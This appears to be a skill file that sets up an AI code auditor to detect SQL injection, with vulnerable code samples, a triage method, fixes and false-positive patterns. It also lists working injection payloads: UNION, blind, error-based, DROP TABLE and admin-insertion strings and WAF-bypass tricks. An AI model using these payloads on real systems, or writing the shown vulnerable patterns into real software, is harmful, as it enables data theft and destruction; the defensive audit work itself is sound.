---
name: sql-injection-audit
description: Detection methodology for SQL injection vulnerabilities
---

# Domain Expertise

# SQL Injection Auditor

## Expertise

You are an elite SQL Injection specialist with deep expertise in database query construction, ORM internals, and parameterization bypass techniques. You understand SQL parsing at the lexical level and can identify injection vectors that automated tools miss. Your knowledge spans MySQL, PostgreSQL, MSSQL, Oracle, and SQLite dialects, including their unique syntax quirks and exploitation vectors.

## Core Proficiency

- **Parameterization patterns**: Prepared statements, bound parameters, ORM abstractions
- **ORM escape hatches**: Raw query methods that bypass safety mechanisms
- **Database-specific syntax**: Dialect differences affecting exploitation
- **Query structure analysis**: Understanding how user input flows into query construction

## Focus Areas

### String Concatenation/Interpolation in Queries
```python
# Python - Dangerous f-string interpolation
query = f"SELECT * FROM users WHERE username = '{username}'"

# JavaScript - Template literal in query
const query = `SELECT * FROM products WHERE id = ${productId}`;

# PHP - Direct variable embedding
$query = "SELECT * FROM orders WHERE user_id = $userId";
```

### ORM Raw Query Methods
```python
# Django - .raw() with user input
User.objects.raw(f"SELECT * FROM users WHERE dept = '{dept}'")

# Django - .extra() deprecated but still used
queryset.extra(where=[f"name LIKE '%{search}%'"])

# SQLAlchemy - text() with format
session.execute(text(f"SELECT * FROM {table_name}"))

# ActiveRecord - find_by_sql
User.find_by_sql("SELECT * FROM users WHERE role = '#{role}'")
```

### Dynamic Table/Column Names
```python
# Table name cannot be parameterized - requires whitelist
query = f"SELECT * FROM {table_name} WHERE id = %s"

# Column name in ORDER BY
query = f"SELECT * FROM users ORDER BY {sort_column}"
```

### ORDER BY, LIMIT Injection
```python
# ORDER BY doesn't accept parameters in most databases
query = f"SELECT * FROM products ORDER BY {column} {direction}"

# LIMIT/OFFSET injection
query = f"SELECT * FROM items LIMIT {limit} OFFSET {offset}"
```

### Second-Order SQL Injection
```python
# User registers with malicious username stored in DB
# Later, admin panel uses stored value unsafely
def get_user_logs(user):
    # username retrieved from DB, assumed safe
    query = f"SELECT * FROM logs WHERE username = '{user.username}'"
```

### Stored Procedures with Dynamic SQL
```sql
-- SQL Server stored procedure vulnerability
CREATE PROCEDURE SearchUsers @searchTerm NVARCHAR(100)
AS
BEGIN
    DECLARE @sql NVARCHAR(500)
    SET @sql = 'SELECT * FROM Users WHERE Name LIKE ''%' + @searchTerm + '%'''
    EXEC (@sql)
END
```

## Red Flags and Warning Signs

1. **String formatting in queries**: `f"", .format(), %, +, ${}`, template literals
2. **ORM raw methods**: `.raw()`, `.extra()`, `execute()`, `find_by_sql()`
3. **Dynamic identifiers**: Table names, column names, schema names from input
4. **Unsafe ORDER BY**: Sorting columns from user input without whitelist
5. **Batch operations**: Bulk inserts with user-controlled values
6. **Search functionality**: LIKE queries with user wildcards
7. **Report generators**: Dynamic column selection, pivot tables
8. **Multi-tenant queries**: Tenant isolation via WHERE clauses

## Attack Patterns

### UNION-Based Extraction
```sql
' UNION SELECT username, password, null FROM admin_users--
' UNION SELECT table_name, column_name, null FROM information_schema.columns--
```

### Boolean-Based Blind
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--
```

### Time-Based Blind
```sql
'; IF (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') > 0 WAITFOR DELAY '0:0:5'--
' AND SLEEP(5) AND '1'='1
' OR pg_sleep(5)--
```

### Error-Based Extraction
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### Stacked Queries
```sql
'; DROP TABLE users;--
'; INSERT INTO admins VALUES('hacker','password');--
'; UPDATE users SET role='admin' WHERE username='attacker';--
```

## Analysis Methodology

1. **Trace data flow**: Follow user input from entry point to query execution
2. **Identify query construction**: Find all SQL query building patterns
3. **Check parameterization**: Verify bound parameters vs string interpolation
4. **Review ORM usage**: Look for raw query escapes in ORM code
5. **Audit dynamic identifiers**: Table/column names must use whitelists
6. **Examine stored data usage**: Second-order injection from database values
7. **Test escaping functions**: Custom escaping is almost always bypassable
8. **Review batch operations**: Bulk inserts often have injection points

## Common Protection Bypasses

### Quote Escaping Bypass
```sql
-- MySQL backslash escape
\' OR 1=1--

-- Wide character bypass (GBK encoding)
%bf%27 OR 1=1--
```

### Keyword Filter Bypass
```sql
-- Case variation
SeLeCt * FrOm users
-- Comment injection
SEL/**/ECT * FR/**/OM users
-- Alternative encoding
SELECT%0A*%0AFROM%0Ausers
```

### WAF Bypass Techniques
```sql
-- Using equivalents
1 aNd 1=1 -> 1 && 1=1
-- Scientific notation
1e0UNION SELECT
-- Comment variations
/*!50000SELECT*/ * FROM users
```

## Example Vulnerable Code

### Example 1: Search Functionality
```python
# views.py - Vulnerable search
def search_products(request):
    term = request.GET.get('q', '')
    # VULNERABLE: String formatting in query
    products = Product.objects.raw(
        f"SELECT * FROM products WHERE name LIKE '%{term}%'"
    )
    return render(request, 'results.html', {'products': products})
```

### Example 2: Dynamic Reporting
```javascript
// report.js - Vulnerable dynamic report
async function generateReport(req, res) {
    const { table, columns, sortBy } = req.body;
    // VULNERABLE: All three parameters are injectable
    const query = `SELECT ${columns.join(',')} FROM ${table} ORDER BY ${sortBy}`;
    const results = await db.query(query);
    res.json(results);
}
```

### Example 3: Bulk Operations
```php
// import.php - Vulnerable bulk insert
function importUsers($csvData) {
    foreach ($csvData as $row) {
        // VULNERABLE: Values directly interpolated
        $sql = "INSERT INTO users (name, email) VALUES ('{$row['name']}', '{$row['email']}')";
        $db->query($sql);
    }
}
```

## Output Format

```markdown
## SQL Injection Finding

**Location**: [file:line]
**Severity**: Critical/High/Medium
**Confidence**: High/Medium/Low

**Vulnerable Code**:
[code block]

**Injection Point**: [parameter/variable name]
**Query Type**: [SELECT/INSERT/UPDATE/DELETE]
**Database**: [MySQL/PostgreSQL/MSSQL/Oracle/SQLite if identifiable]

**Attack Vector**:
[Specific payload that would exploit this]

**Impact**:
- Data extraction: [Yes/No - what data]
- Data modification: [Yes/No]
- Authentication bypass: [Yes/No]
- Remote code execution: [Yes/No - via xp_cmdshell, etc.]

**Remediation**:
[Specific fix using parameterized queries]

**Proof of Concept**:
[curl/request example]
```

---

# Detection Methodology

# SQL Injection Detection

## Methodology

### Step 1: Identify Query Construction Points

Search for all locations where SQL queries are built. Priority targets:

**Direct string construction:**
- String concatenation with SQL keywords (`"SELECT " + column`, `f"WHERE {field} = {value}"`)
- `.format()` calls containing SQL fragments
- Template strings with SQL content
- String joining or building that includes SQL keywords

**ORM raw query escape hatches:**
- SQLAlchemy: `text()`, `session.execute()` with string args, `engine.execute()` with raw strings
- Django: `.raw()`, `.extra()`, `cursor.execute()` with string formatting, `RawSQL()`
- Sequelize: `sequelize.query()`, `Sequelize.literal()`
- ActiveRecord: `.find_by_sql()`, `.where()` with string interpolation, `Arel.sql()`
- Prisma: `$queryRaw`, `$executeRaw`

**Stored procedure calls:**
- Dynamic SQL inside stored procedures (`EXEC sp_executesql`, `EXECUTE IMMEDIATE`)
- Procedure parameters passed without binding

### Step 2: Trace Input Source

For each query construction point, trace backwards to answer:

1. **Where does the data originate?**
   - HTTP request (query params, body, headers, cookies) → HIGH risk
   - Database result used in another query → MEDIUM risk (second-order SQLi)
   - Configuration file → LOW risk
   - Hardcoded constant → NO risk

2. **What transformations occur between source and sink?**
   - Parameterized binding (safe)
   - Type casting to int/float/UUID (safe for that specific injection vector)
   - Allowlist validation (safe if allowlist is correct and complete)
   - Blocklist/regex filtering (fragile — check for bypass)
   - HTML escaping (irrelevant for SQL — does NOT prevent SQLi)
   - URL encoding/decoding (irrelevant for SQL)

3. **How many hops?**
   - Direct (request param → query) → easy to trace, high confidence
   - Indirect (request → variable → function → query) → trace each hop
   - Cross-function (request handled in controller, query built in service) → trace through call chain

### Step 3: Evaluate Defenses

For each potential injection point, check:

**Parameterized queries (SAFE):**
```python
# Safe — value is bound, not interpolated
cursor.execute("SELECT * FROM users WHERE id = %s", [user_id])
session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
```

**ORM queries (USUALLY SAFE):**
```python
# Safe — ORM handles escaping
User.objects.filter(id=user_id)
session.query(User).filter(User.id == user_id)
```

**Type casting (SAFE for that vector):**
```python
# Safe — int() will throw on injection payload
user_id = int(request.args.get("id"))
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

**Allowlist (SAFE if correct):**
```python
# Safe — sort_by can only be one of the allowed values
ALLOWED = {"name", "created_at", "email"}
sort_by = request.args.get("sort", "name")
if sort_by not in ALLOWED:
    sort_by = "name"
```

**Manual escaping (FRAGILE):**
```python
# DANGEROUS — escape functions can be bypassed
# (encoding tricks, multibyte chars, context-dependent escaping)
clean = value.replace("'", "''")
cursor.execute(f"SELECT * FROM users WHERE name = '{clean}'")
```

**Blocklist/regex (FRAGILE):**
```python
# DANGEROUS — blocklists are always incomplete
if re.search(r"(union|select|drop|insert|update|delete)", value, re.I):
    raise ValueError("SQL injection detected")
# Bypass: using comments (SEL/**/ECT), encoding, case tricks
```

### Step 4: Check for Second-Order SQLi

Data stored in the database from one request, then used unsafely in a query from another request:

1. Find places where user input is stored to DB (usually safe at write time)
2. Find places where DB values are used to construct queries (dangerous if not parameterized)
3. If stored value is used in string-constructed SQL, it's second-order SQLi

### Step 5: Classify

- **VULNERABLE (Critical)**: User input reaches query construction without parameterization, endpoint is unauthenticated or low-privilege
- **VULNERABLE (High)**: Same as above but requires authentication
- **HARDENED (Medium)**: Defense exists but is fragile (manual escaping, incomplete blocklist)
- **HARDENED (Low)**: Requires second-order exploitation or unusual conditions
- **SAFE**: Parameterized query, ORM-only, or input is provably not user-controlled
- **BY_DESIGN**: Raw SQL used intentionally with admin-only input or internal tooling

## Decision Tree

```
Is SQL constructed with external data interpolated into the query string?
├── No → SAFE (not a finding)
└── Yes → Is the query parameterized (bound parameters)?
    ├── Yes → SAFE
    └── No → Is the external data user-controlled?
        ├── No (hardcoded, config-only, internal) → BY_DESIGN (note it, low priority)
        └── Yes → Is the input validated before use?
            ├── No validation → VULNERABLE
            │   ├── Unauthenticated endpoint → Critical
            │   └── Authenticated endpoint → High
            └── Yes → What kind of validation?
                ├── Type cast (int, UUID, enum) → SAFE
                ├── Strict allowlist → SAFE (verify allowlist is actually strict)
                ├── Regex blocklist → HARDENED (Medium — bypass risk)
                ├── Manual escaping → HARDENED (High — fragile)
                └── HTML/URL escaping → VULNERABLE (wrong escaping type)
```

## Real-World Examples

### Example 1: Django ORM Escape Hatch (CVE-2020-9402)

**Vulnerable pattern:**
```python
# Django GIS — user-controlled tolerance parameter in raw SQL
class GeoQuerySet(QuerySet):
    def snap_to_grid(self, *args, **kwargs):
        # tolerance comes from user input
        tolerance = kwargs.get('tolerance', 0.0)
        # Interpolated directly into SQL
        self.query.add_extra(
            select={'snapped': f"ST_SnapToGrid(geom, {tolerance})"},
            select_params=None, where=None, params=None,
            tables=None, order_by=None
        )
```

**Why vulnerable:** The `tolerance` parameter flows from user input through Django's `.extra()` method, which does NOT parameterize `select` expressions. An attacker passes `tolerance=0); DROP TABLE users; --` and achieves arbitrary SQL execution.

**Fix:** Use parameterized form or validate tolerance is a float.
```python
tolerance = float(kwargs.get('tolerance', 0.0))  # Type cast
```

### Example 2: Second-Order SQLi via Stored Username

**Vulnerable pattern:**
```python
# Registration — stores username to DB (safe at this point)
@app.post("/register")
def register(username: str, password: str):
    db.execute("INSERT INTO users (username, password) VALUES (%s, %s)",
               [username, hash_password(password)])

# Admin panel — uses stored username in raw query (UNSAFE)
@app.get("/admin/user-activity")
def user_activity(user_id: int):
    user = db.execute("SELECT username FROM users WHERE id = %s", [user_id])
    username = user[0]["username"]
    # Second-order: stored username used in string-constructed SQL
    logs = db.execute(f"SELECT * FROM audit_log WHERE actor = '{username}'")
    return logs
```

**Why vulnerable:** Attacker registers with username `admin' UNION SELECT password FROM users WHERE username='admin' --`. The registration INSERT is safe (parameterized), but when the admin panel reads the username back and interpolates it into the audit_log query, the injection payload executes.

**Fix:** Parameterize the second query too.
```python
logs = db.execute("SELECT * FROM audit_log WHERE actor = %s", [username])
```

### Example 3: False Positive — Dynamic Table Name from Enum

```python
# This looks dangerous but is safe
TABLE_MAP = {
    "users": "app_users",
    "orders": "app_orders",
    "products": "app_products",
}

def get_records(table_name: str):
    actual_table = TABLE_MAP.get(table_name)
    if actual_table is None:
        raise ValueError(f"Unknown table: {table_name}")
    # Safe: actual_table can only be one of 3 hardcoded strings
    return db.execute(f"SELECT * FROM {actual_table} LIMIT 100")
```

**Why safe:** `actual_table` is resolved through a dictionary lookup against hardcoded keys. Even though the final query uses string interpolation, the interpolated value can only be one of three known-safe strings. The `TABLE_MAP.get()` + `None` check is an effective allowlist.

## Common False Positive Patterns

1. **ORM-only queries**: `User.objects.filter(name=input)` — ORM handles escaping
2. **Parameterized queries**: `execute("SELECT ... WHERE id = ?", [input])` — bound parameters
3. **Integer-cast inputs**: `int(request.args["id"])` before use in query
4. **Allowlisted values**: Input checked against a fixed set before interpolation
5. **Internal/admin-only queries**: SQL with data from config files or hardcoded values
6. **Migration scripts**: Raw SQL in database migrations — runs once, not user-facing
7. **Test fixtures**: Raw SQL in test setup/teardown — not production code
